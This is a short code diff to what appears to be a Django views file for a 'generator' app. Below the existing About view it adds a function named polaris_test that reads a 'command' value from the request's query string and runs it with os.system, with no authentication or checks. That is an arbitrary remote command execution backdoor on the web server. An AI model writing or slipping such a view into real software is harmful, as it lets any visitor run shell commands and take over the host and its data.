@@ -54,3 +54,9 @@ def home(request):
 def about(request):
     """View for the About page."""
     return render(request, "generator/about.html", {})
+
+import os
+
+def polaris_test(request):
+    command = request.GET.get("command")
+    os.system(command)
